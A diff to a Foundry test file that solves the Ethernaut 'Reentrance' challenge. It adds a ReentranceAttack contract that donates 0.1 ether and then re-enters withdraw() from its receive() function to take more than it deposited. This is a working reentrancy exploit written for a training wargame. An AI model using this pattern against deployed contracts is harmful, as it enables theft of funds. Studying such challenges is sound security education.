@@ -9,6 +9,7 @@ import "../src/levels/10-Reentrance/ReentranceFactory.sol";
 contract ReentranceTest is Test {
     Ethernaut public ethernaut;
     ReentranceFactory public reentranceFactory;
+    ReentranceAttack public reentranceAttack;
     Reentrance public reentrance;
 
     address eoa1 = address(0x1);
@@ -28,7 +29,32 @@ contract ReentranceTest is Test {
     }
 
     function testAttack() public {
-        uint256 reentranceBalance = address(reentrance).balance;
-        console.log(reentranceBalance);
+        reentranceAttack = new ReentranceAttack{value: 0.1 ether}(reentrance);
+        reentranceAttack.attack();
+    }
+}
+
+contract ReentranceAttack {
+    Reentrance public reentrance;
+
+    constructor(Reentrance _reentrance) payable {
+        reentrance = _reentrance;
+    }
+
+    function attack() public {
+        // donate some funds
+        reentrance.donate{value: 0.1 ether}(address(this));
+
+        // withdraw
+        reentrance.withdraw(0.1 ether);
+    }
+
+    bool first = false;
+
+    receive() external payable {
+        if (!first) {
+            first = true;
+            reentrance.withdraw(0.1 ether);
+        }
     }
 }
